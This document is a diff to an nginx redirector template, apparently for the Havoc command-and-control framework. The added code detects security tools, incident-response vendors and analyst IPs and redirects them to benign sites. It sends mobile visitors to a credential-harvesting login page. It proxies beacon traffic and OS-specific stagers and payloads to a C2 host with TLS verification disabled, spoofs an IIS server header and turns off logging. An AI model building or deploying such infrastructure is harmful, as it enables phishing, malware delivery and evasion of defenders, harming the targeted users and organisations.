@@ -1,3 +1,26 @@
+# Advanced Redirector Configuration with IR Evasion
+# templates/redirector-site.conf.j2
+
+# Detect security tools by user agent
+map $http_user_agent $is_security_tool {
+    default 0;
+    # Common security tools, scanners, and IR user agents
+    ~*(security|incident|response|virus|malware|cuckoo|wireshark|burp|nessus|qualys|openvas|nmap|tenable|rapid7|metasploit|paros|zap|nikto|scylla|splunk|elastic|defender|crowdstrike|sentinel|cylance|carbon\sblack|fireeye|mandiant|symantec|mcafee|sophos|kaspersky|analyst|forensic|edr|xdr|siem) 1;
+}
+
+map $http_user_agent $is_mobile {
+    default 0;
+    ~*(android|iphone|ipad|mobile|phone|ios|ipod) 1;
+}
+
+map $remote_addr $is_known_security_ip {
+    default 0;
+    # Example security vendor IP ranges - replace with actual ones
+    "192.168.1.0/24" 1;  # Example placeholder
+    "10.0.0.0/8" 1;      # Example placeholder
+}
+
+# HTTP to HTTPS redirect
 server {
     listen 80;
     listen [::]:80;
@@ -7,6 +30,7 @@ server {
     return 301 https://$host$request_uri;
 }
 
+# Main HTTPS server
 server {
     listen 443 ssl;
     listen [::]:443 ssl;
@@ -25,22 +49,46 @@ server {
     root /var/www/html;
     index index.html;
     
-    # Primary location for legitimate website traffic
-    location / {
-        try_files $uri $uri/ =404;
+    # Advanced IR Evasion
+    # 1. Redirect security tools to benign sites
+    if ($is_security_tool) {
+        return 302 https://www.google.com;
     }
     
-    # Only expose beacon callback paths - NOT dashboard or admin functions
+    # 2. Redirect known security IPs
+    if ($is_known_security_ip) {
+        return 302 https://www.microsoft.com;
+    }
+    
+    # 3. Direct mobile users to credential capture
+    if ($is_mobile) {
+        return 302 https://{{ redirector_subdomain }}.{{ domain }}/login/auth.html;
+    }
+    
+    # 4. Add timing delay for suspicious connections
+    if ($http_referer ~* (security|scan)) {
+        set $delay_response 1;
+    }
+    
+    # Valid C2 beacon routing - CRITICAL PATHS
     location ~ ^/api/beacon/ {
+        # Only valid beacons proceed to C2
         proxy_pass https://{{ c2_ip }}:{{ havoc_https_port | default(443) }};
         proxy_http_version 1.1;
         proxy_set_header Host $host;
         proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
         proxy_set_header X-Real-IP $remote_addr;
+        proxy_ssl_verify off;
+        
+        # Implement artificial delay for suspicious connections
+        if ($delay_response) {
+            limit_rate 1k;  # Slow down response
+        }
     }
     
     # Secure stager delivery routes
     location ~ ^/(windows|linux)_stager\.(ps1|sh)$ {
+        # Only valid requests that passed the earlier checks
         proxy_pass http://{{ c2_ip }}:8443/$1_stager.$2;
         proxy_http_version 1.1;
         proxy_set_header Host $host;
@@ -50,11 +98,24 @@ server {
     
     # Content access for payload delivery
     location ~ ^/content/(windows|linux)/(.+)$ {
+        # Specific valid content paths
         proxy_pass http://{{ c2_ip }}:8443/content/$1/$2;
         proxy_http_version 1.1;
         proxy_set_header Host $host;
         proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
         proxy_set_header X-Real-IP $remote_addr;
+    }
+
+    # Redirect specific payload formats based on client OS
+    location ~ ^/download/payload$ {
+        if ($http_user_agent ~* windows) {
+            return 302 /content/windows/$win_exe;
+        }
+        if ($http_user_agent ~* linux) {
+            return 302 /content/linux/$linux_bin;
+        }
+        # Default fallback for unknown OS
+        return 302 /;
     }
 
     # Secure payload delivery path for synced payloads
@@ -67,6 +128,29 @@ server {
         add_header Server "Microsoft-IIS/10.0" always;
         autoindex off;
         access_log off;
+    }
+    
+    # Credential harvesting login page
+    location ~ ^/login/auth\.html$ {
+        root /var/www;
+        try_files $uri =404;
+        add_header X-Frame-Options "DENY" always;
+    }
+    
+    # Protect credential processing script
+    location ~ ^/login/process\.php$ {
+        # Allow POST only
+        limit_except POST { deny all; }
+        
+        # Process the PHP file
+        include snippets/fastcgi-php.conf;
+        fastcgi_pass unix:/var/run/php/php7.4-fpm.sock;
+    }
+
+    # Block direct access to sensitive files
+    location ~ \.(enc|key|pem|log)$ {
+        deny all;
+        return 404;
     }
     
     {% if setup_integrated_tracker | default(false) | bool %}
@@ -84,6 +168,19 @@ server {
         expires -1;
     }
     {% endif %}
+    
+    # Primary location for legitimate website traffic
+    # This acts as a catch-all for non-matching URIs
+    location / {
+        # Check if this is potentially an attempt to access a non-existent payload
+        if ($request_uri ~* \.(exe|dll|ps1|sh|py|vbs|hta)$) {
+            # If invalid payload URI, redirect to real target
+            return 302 https://www.{{ domain }};
+        }
+        
+        # Otherwise serve legitimate content
+        try_files $uri $uri/ =404;
+    }
 
     # Security headers
     add_header X-Content-Type-Options "nosniff" always;
@@ -91,6 +188,9 @@ server {
     add_header X-XSS-Protection "1; mode=block" always;
     add_header Referrer-Policy "no-referrer" always;
     add_header Content-Security-Policy "default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'; img-src 'self' data:;" always;
+    
+    # Make server appear as IIS
+    add_header Server "Microsoft-IIS/10.0";
     
     # Disable logging
     {% if zero_logs | default(true) | bool %}
@@ -109,6 +209,7 @@ server {
     ssl_certificate /etc/ssl/certs/ssl-cert-snakeoil.pem;
     ssl_certificate_key /etc/ssl/private/ssl-cert-snakeoil.key;
     
+    # Redirect unknown hosts to legitimate sites
     return 301 https://www.google.com;
     
     access_log off;
